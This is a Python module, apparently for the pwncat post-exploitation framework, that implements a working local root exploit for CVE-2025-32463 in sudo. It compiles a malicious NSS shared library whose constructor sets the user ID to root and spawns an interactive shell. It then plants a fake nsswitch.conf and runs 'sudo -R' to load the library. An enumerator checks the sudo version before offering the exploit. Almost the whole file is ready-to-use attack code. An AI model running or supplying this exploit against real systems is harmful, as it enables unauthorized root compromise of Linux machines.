#!/usr/bin/env python3
"""
pwncat-vl ExecuteAbility + Enumerator
CVE-2025-32463  – sudo “-R” / NSS-preload LPE
"""

import textwrap
import subprocess
from io import StringIO

from packaging.version import InvalidVersion, parse

from pwncat.facts import ExecuteAbility
from pwncat.modules import ModuleFailed
from pwncat.subprocess import CalledProcessError
from pwncat.platform.linux import Linux, PlatformError
from pwncat.modules.enumerate import Schedule, EnumerateModule


class CVE_2025_32463(ExecuteAbility):
    """sudo -R NSS-preload root shell"""

    PROVIDES = ["ability.execute", "ability.file.write", "ability.file.read"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.PER_USER

    def __init__(self, source: str, sudo_ver: str):
        super().__init__(source=source, source_uid=None, uid=0)
        self.sudo_ver = sudo_ver

    def shell(self, session):
        payload = textwrap.dedent(r"""
            #include <stdlib.h>
            #include <unistd.h>
            __attribute__((constructor))
            void woot(void){
                setreuid(0,0); setregid(0,0);
                chdir("/");
                execl("/bin/sh","/bin/sh","-i",NULL);
            }
        """).lstrip()

        try:
            stage = (
                session.platform.run(
                    ["mktemp", "-d", "/tmp/sudowoot.stage.XXXXXX"],
                    capture_output=True,
                    check=True,
                )
                .stdout.decode()
                .strip()
            )

            session.platform.chdir(stage)
            session.platform.run(["mkdir", "-p", "woot/etc", "libnss_"], check=True)

            so = "libnss_/woot1337.so.2"
            session.platform.compile(
                [StringIO(payload)],
                output=so,
                cflags=["-shared", "-fPIC"],
                ldflags=["-Wl,-init,woot"],
            )

            session.platform.run(
                ["sh", "-c", "echo 'passwd: /woot1337' > woot/etc/nsswitch.conf"],
                check=True,
            )
            session.platform.run(["cp", "/etc/group", "woot/etc"], check=True)

            proc = session.platform.Popen(
                ["sudo", "-R", "woot", "woot"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            proc.detach()

            if session.platform.refresh_uid() != 0:
                raise ModuleFailed("exploit executed but still not root")

            return lambda s: s.platform.channel.send(b"exit\n")

        except (PlatformError, CalledProcessError) as exc:
            raise ModuleFailed(f"exploit failed: {exc}") from exc

    def title(self, session):
        return (
            f"[cyan]sudo {self.sudo_ver}[/cyan] vulnerable to [red]CVE-2025-32463[/red]"
        )


class Module(EnumerateModule):
    """Offer CVE-2025-32463 ExecuteAbility"""

    PROVIDES = ["ability.execute"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.PER_USER

    def enumerate(self, session):
        # Pas la peine si déjà root
        u = session.current_user()
        if u is None or u.id == 0:
            return

        try:
            ver_fact = session.run("enumerate", types=["software.sudo.version"])[0]
            ver = ver_fact.version
        except IndexError:
            return

        try:
            if (
                not ver.startswith("1.9.")
                or parse(ver.replace("p", ".")) < parse("1.9.14")
                or ver.startswith("1.9.17")
            ):
                return
        except InvalidVersion:
            return

        try:
            if (
                "-R"
                not in session.platform.run(
                    ["sudo", "-h"], capture_output=True, check=True
                ).stdout.decode()
            ):
                return
        except CalledProcessError:
            return

        yield CVE_2025_32463(self.name, ver)
